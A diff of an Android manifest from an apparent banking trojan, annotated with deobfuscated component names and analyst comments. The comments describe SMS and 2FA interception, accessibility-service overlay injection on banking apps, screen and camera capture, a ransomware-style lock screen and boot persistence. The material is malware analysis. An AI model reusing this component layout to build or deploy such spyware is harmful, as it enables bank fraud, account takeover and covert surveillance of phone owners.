@@ -175,7 +175,7 @@
         <!-- MAIN LAUNCHER ACTIVITY (transparent, hidden from recents) -->
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:name="linker.resourcer.encoder.Vwfkyqppf"
+            android:name="linker.resourcer.encoder.Vwfkyqppf" <!-- DEOBFUSCATED: SplashActivity -->
             android:exported="true"/>
         <activity-alias
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
@@ -184,7 +184,7 @@
             android:name="linker.resourcer.encoder.Vauplisa"
             android:enabled="true"
             android:exported="true"
-            android:targetActivity="linker.resourcer.encoder.Vwfkyqppf"
+            android:targetActivity="linker.resourcer.encoder.Vwfkyqppf" <!-- DEOBFUSCATED: SplashActivity -->
             android:hardwareAccelerated="false">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
@@ -217,7 +217,7 @@
             android:enabled="true"
             android:exported="true"
             android:screenOrientation="unspecified"
-            android:targetActivity="linker.resourcer.encoder.Vwfkyqppf"
+            android:targetActivity="linker.resourcer.encoder.Vwfkyqppf" <!-- DEOBFUSCATED: SplashActivity -->
             android:hardwareAccelerated="false"
             android:roundIcon="@drawable/r_rimqg1">
             <intent-filter android:priority="1">
@@ -229,7 +229,7 @@
         </activity-alias>
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:name="linker.resourcer.encoder.yynnsnupqughbjmsvq"
+            android:name="linker.resourcer.encoder.yynnsnupqughbjmsvq" <!-- DEOBFUSCATED: WebViewActivity -->
             android:enabled="true"
             android:exported="true"
             android:launchMode="singleTop"
@@ -240,7 +240,7 @@
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
             android:label="Lock"  <!-- SCREEN LOCKER — ransomware-style lock screen -->
             android:icon="@android:color/transparent"
-            android:name="linker.resourcer.encoder.gqzcedqwhiflurlhzg"
+            android:name="linker.resourcer.encoder.gqzcedqwhiflurlhzg" <!-- DEOBFUSCATED: LockScreenActivity -->
             android:enabled="true"
             android:exported="true"
             android:excludeFromRecents="true"
@@ -250,45 +250,45 @@
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
             android:label="Alerts"
-            android:name="linker.resourcer.encoder.Vmwtzvb"
+            android:name="linker.resourcer.encoder.Vmwtzvb" <!-- DEOBFUSCATED: AlertDialogActivity -->
             android:exported="true"
             android:excludeFromRecents="true"
             android:noHistory="true"/>
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
             android:label="Alerts"
-            android:name="linker.resourcer.encoder.Vavralm"
+            android:name="linker.resourcer.encoder.Vavralm" <!-- DEOBFUSCATED: UpdatePromptActivity -->
             android:exported="true"
             android:excludeFromRecents="true"
             android:noHistory="true"/>
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:name="linker.resourcer.encoder.ioyprmdkewxbrnopufrfjh"
+            android:name="linker.resourcer.encoder.ioyprmdkewxbrnopufrfjh" <!-- DEOBFUSCATED: PermissionsRequestActivity -->
             android:exported="true"/>
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:name="linker.resourcer.encoder.ajagnkhugafikwbjqn"
+            android:name="linker.resourcer.encoder.ajagnkhugafikwbjqn" <!-- DEOBFUSCATED: DrawOverlayPermissionActivity -->
             android:exported="true"/>
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:name="linker.resourcer.encoder.Vupzturl"
+            android:name="linker.resourcer.encoder.Vupzturl" <!-- DEOBFUSCATED: TextToSpeechActivity -->
             android:exported="true"
             android:process=":speak"/>
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:name="linker.resourcer.encoder.qbhdlzfxnvfzrgssjp"
+            android:name="linker.resourcer.encoder.qbhdlzfxnvfzrgssjp" <!-- DEOBFUSCATED: AccessibilityPromptActivity -->
             android:exported="true"
             android:excludeFromRecents="true"
             android:noHistory="true"
             android:hardwareAccelerated="true"/>
         <activity
-            android:name="linker.resourcer.encoder.ljlrrgixsoamhgrjmistiugd"
+            android:name="linker.resourcer.encoder.ljlrrgixsoamhgrjmistiugd" <!-- DEOBFUSCATED: WebSocketCommandHandler -->
             android:exported="true"
             android:excludeFromRecents="true"
             android:noHistory="true"/>
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:name="linker.resourcer.encoder.dfcfkxjhxpghnfgax"
+            android:name="linker.resourcer.encoder.dfcfkxjhxpghnfgax" <!-- DEOBFUSCATED: ScreenCaptureInitActivity -->
             android:exported="true"
             android:showWhenLocked="true"
             android:turnScreenOn="true"/>
@@ -299,35 +299,35 @@
             android:showWhenLocked="true"
             android:turnScreenOn="true"/>
         <activity
-            android:name="linker.resourcer.encoder.fcthltsynhhwdppwuqxrf"
+            android:name="linker.resourcer.encoder.fcthltsynhhwdppwuqxrf" <!-- DEOBFUSCATED: DataSaverPromptActivity -->
             android:exported="true"
             android:excludeFromRecents="true"
             android:noHistory="true"/>
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:name="linker.resourcer.encoder.mshhnsexiknatxokxsmhiet"
+            android:name="linker.resourcer.encoder.mshhnsexiknatxokxsmhiet" <!-- DEOBFUSCATED: PermissionRequestActivity -->
             android:exported="true"/>
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:name="linker.resourcer.encoder.nnvknydszrgpycrmrnvrctajxq"
+            android:name="linker.resourcer.encoder.nnvknydszrgpycrmrnvrctajxq" <!-- DEOBFUSCATED: IncompatibilityNotificationActivity -->
             android:exported="true"
             android:excludeFromRecents="true"
             android:noHistory="true"/>
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:name="linker.resourcer.encoder.vrxozgomrxilqngdjfuhzqgbd"
+            android:name="linker.resourcer.encoder.vrxozgomrxilqngdjfuhzqgbd" <!-- DEOBFUSCATED: BatteryOptimizationSetupActivity -->
             android:exported="true"
             android:excludeFromRecents="true"
             android:noHistory="true"/>
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:name="linker.resourcer.encoder.rifkexhhowycarwqecbijsnsad"
+            android:name="linker.resourcer.encoder.rifkexhhowycarwqecbijsnsad" <!-- DEOBFUSCATED: AppLauncherActivity -->
             android:exported="true"
             android:excludeFromRecents="true"
             android:noHistory="true"/>
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:name="linker.resourcer.encoder.khkpbnqozqiffemrwsat"
+            android:name="linker.resourcer.encoder.khkpbnqozqiffemrwsat" <!-- DEOBFUSCATED: ChatUIActivity -->
             android:exported="true"
             android:excludeFromRecents="true"
             android:windowSoftInputMode="adjustResize"
@@ -335,7 +335,7 @@
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
             android:label="View"
-            android:name="linker.resourcer.encoder.nibxhxsrbqdbqgffwz"
+            android:name="linker.resourcer.encoder.nibxhxsrbqdbqgffwz" <!-- DEOBFUSCATED: BrowserSpyActivity -->
             android:exported="true"
             android:excludeFromRecents="true"
             android:configChanges="screenSize|orientation"
@@ -343,12 +343,12 @@
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
             android:label="View"
-            android:name="linker.resourcer.encoder.ajuywtfqizlhmijsqlm"
+            android:name="linker.resourcer.encoder.ajuywtfqizlhmijsqlm" <!-- DEOBFUSCATED: InjectTargetActivity -->
             android:exported="true"
             android:excludeFromRecents="true"
             android:launchMode="singleInstance"/>
         <service
-            android:name="linker.resourcer.encoder.lqvpqwmhpvnnlhskxyjdwphzvsl"
+            android:name="linker.resourcer.encoder.lqvpqwmhpvnnlhskxyjdwphzvsl" <!-- DEOBFUSCATED: WorkerService -->
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="specialUse">
@@ -357,7 +357,7 @@
                 android:value="lqvpqwmhpvnnlhskxyjdwphzvsl"/>
         </service>
         <service
-            android:name="linker.resourcer.encoder.pjwwsenqqgjuwxeer"
+            android:name="linker.resourcer.encoder.pjwwsenqqgjuwxeer" <!-- DEOBFUSCATED: CameraStreamingService -->
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="specialUse">
@@ -366,7 +366,7 @@
                 android:value="lqvpqwmhpvnnlhskxyjdwphzvsl"/>
         </service>
         <service
-            android:name="linker.resourcer.encoder.teizflxbclbebgztqrl"
+            android:name="linker.resourcer.encoder.teizflxbclbebgztqrl" <!-- DEOBFUSCATED: HiddenBrowserService -->
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="specialUse">
@@ -375,7 +375,7 @@
                 android:value="lqvpqwmhpvnnlhskxyjdwphzvsl"/>
         </service>
         <service
-            android:name="linker.resourcer.encoder.qswemlflptdlumxqnjrlg"
+            android:name="linker.resourcer.encoder.qswemlflptdlumxqnjrlg" <!-- DEOBFUSCATED: SetupOrchestrationService -->
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="specialUse">
@@ -384,7 +384,7 @@
                 android:value="lqvpqwmhpvnnlhskxyjdwphzvsl"/>
         </service>
         <service
-            android:name="linker.resourcer.encoder.fiptrmhubqehbzswimrkqkxtcvyp"
+            android:name="linker.resourcer.encoder.fiptrmhubqehbzswimrkqkxtcvyp" <!-- DEOBFUSCATED: ProxyServerService -->
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="specialUse">
@@ -393,11 +393,11 @@
                 android:value="lqvpqwmhpvnnlhskxyjdwphzvsl"/>
         </service>
         <service
-            android:name="linker.resourcer.encoder.sylaelrdxlbiltmgf"
+            android:name="linker.resourcer.encoder.sylaelrdxlbiltmgf" <!-- DEOBFUSCATED: StoreLauncherService -->
             android:enabled="true"
             android:exported="false"/>
         <service
-            android:name="linker.resourcer.encoder.vntkbrdpzqkqrlwecwifkuwidib"
+            android:name="linker.resourcer.encoder.vntkbrdpzqkqrlwecwifkuwidib" <!-- DEOBFUSCATED: LocationTrackingService -->
             android:exported="false"
             android:foregroundServiceType="specialUse">
             <property
@@ -405,13 +405,13 @@
                 android:value="lqvpqwmhpvnnlhskxyjdwphzvsl"/>
         </service>
         <service
-            android:name="linker.resourcer.encoder.Vntkkkjkr"
+            android:name="linker.resourcer.encoder.Vntkkkjkr" <!-- DEOBFUSCATED: WorkSchedulerJobService -->
             android:permission="android.permission.BIND_JOB_SERVICE"
             android:enabled="true"
             android:exported="false"/>
         <service
             <!-- SCREEN CAPTURE SERVICE — records victim's screen via MediaProjection -->
-            android:name="linker.resourcer.encoder.jcavdzvncdstlcwvoszkepac"
+            android:name="linker.resourcer.encoder.jcavdzvncdstlcwvoszkepac" <!-- DEOBFUSCATED: ScreenCaptureService -->
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="mediaProjection"/>
@@ -420,7 +420,7 @@
             <!-- ACCESSIBILITY SERVICE — core of the banking trojan.
                  Monitors UI events, auto-clicks, reads screen content,
                  performs overlay injection on banking apps -->
-            android:name="linker.resourcer.encoder.jhvbzpdwpbqgticwdxuva"
+            android:name="linker.resourcer.encoder.jhvbzpdwpbqgticwdxuva" <!-- DEOBFUSCATED: AccessibilityServiceController -->
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:enabled="true"
             android:exported="false">
@@ -433,7 +433,7 @@
         </service>
         <service
             android:label="@string/str_ez2a5z"
-            android:name="linker.resourcer.encoder.jhvbzpdwpbqgticwdxuva"
+            android:name="linker.resourcer.encoder.jhvbzpdwpbqgticwdxuva" <!-- DEOBFUSCATED: AccessibilityServiceController -->
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:enabled="true"
             android:exported="false"
@@ -446,7 +446,7 @@
                 android:resource="@xml/r_qwodwc"/>
         </service>
         <receiver
-            android:name="linker.resourcer.encoder.Vmqwemkv"
+            android:name="linker.resourcer.encoder.Vmqwemkv" <!-- DEOBFUSCATED: AlarmBroadcastReceiver -->
             android:enabled="true"
             android:exported="true">
             <intent-filter>
@@ -455,7 +455,7 @@
         </receiver>
         <!-- BOOT RECEIVER — persistence: restarts malware after reboot -->
         <receiver
-            android:name="linker.resourcer.encoder.Vtbpdyukd"
+            android:name="linker.resourcer.encoder.Vtbpdyukd" <!-- DEOBFUSCATED: BootCompletedReceiver -->
             android:enabled="true"
             android:exported="true">
             <intent-filter>
@@ -466,7 +466,7 @@
             </intent-filter>
         </receiver>
         <receiver
-            android:name="linker.resourcer.encoder.Vsvtpr"
+            android:name="linker.resourcer.encoder.Vsvtpr" <!-- DEOBFUSCATED: BatterySystemReceiver -->
             android:enabled="true"
             android:exported="true">
             <intent-filter>
@@ -483,7 +483,7 @@
         </receiver>
         <activity
             android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen"
-            android:name="linker.resourcer.encoder.mhcbtxabqrusqzejlrru"
+            android:name="linker.resourcer.encoder.mhcbtxabqrusqzejlrru" <!-- DEOBFUSCATED: OverlayActivity -->
             android:enabled="true"
             android:exported="true"
             android:excludeFromRecents="false"
@@ -495,7 +495,7 @@
             android:turnScreenOn="true"/>
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:name="linker.resourcer.encoder.Vsbjtwxrb"
+            android:name="linker.resourcer.encoder.Vsbjtwxrb" <!-- DEOBFUSCATED: IncomingCallActivity -->
             android:enabled="true"
             android:exported="true"
             android:excludeFromRecents="false"
@@ -503,7 +503,7 @@
             android:turnScreenOn="true"/>
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:name="linker.resourcer.encoder.Vepvds"
+            android:name="linker.resourcer.encoder.Vepvds" <!-- DEOBFUSCATED: InitializationActivity -->
             android:exported="true">
             <intent-filter>
                 <action android:name="vtehsix.vcvkxhfwc.vwxbekb.vywesy"/>
@@ -512,7 +512,7 @@
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
             android:label="wake"
-            android:name="linker.resourcer.encoder.wwtnccqnreyohgcnbgpqznc"
+            android:name="linker.resourcer.encoder.wwtnccqnreyohgcnbgpqznc" <!-- DEOBFUSCATED: WakeLockActivity -->
             android:excludeFromRecents="true"
             android:showForAllUsers="true"
             android:turnScreenOn="true"/>
@@ -531,7 +531,7 @@
             android:value="https://play.google.com/store"/>
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:name="linker.resourcer.encoder.Vlrgnfjo"
+            android:name="linker.resourcer.encoder.Vlrgnfjo" <!-- DEOBFUSCATED: ActionIntentReceiver -->
             android:exported="true">
             <intent-filter>
                 <action android:name="App.BAK.LOAD"/>
@@ -543,7 +543,7 @@
         <service
             android:label="@string/str_ez2a5z"
             <!-- DREAM SERVICE — acts as screensaver to maintain persistent presence -->
-            android:name="linker.resourcer.encoder.Msss"
+            android:name="linker.resourcer.encoder.Msss" <!-- DEOBFUSCATED: PersistentDreamService -->
             android:permission="android.permission.BIND_DREAM_SERVICE"
             android:exported="true">
             <intent-filter>
@@ -557,7 +557,7 @@
         <activity
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
             <!-- DEFAULT DIALER REPLACEMENT — intercepts tel: intents -->
-            android:name="linker.resourcer.encoder.defaultsactivity"
+            android:name="linker.resourcer.encoder.defaultsactivity" <!-- DEOBFUSCATED: DefaultDialerSmsActivity -->
             android:exported="true"
             android:showWhenLocked="true"
             android:turnScreenOn="true">
@@ -586,7 +586,7 @@
             android:value="99999999"/>
         <!-- SMS INTERCEPTOR — priority 999, steals incoming SMS (2FA codes) -->
         <receiver
-            android:name="linker.resourcer.encoder.Voadet"
+            android:name="linker.resourcer.encoder.Voadet" <!-- DEOBFUSCATED: SmsInterceptorReceiver -->
             android:permission="android.permission.BROADCAST_SMS"
             android:exported="true">
             <intent-filter android:priority="999">
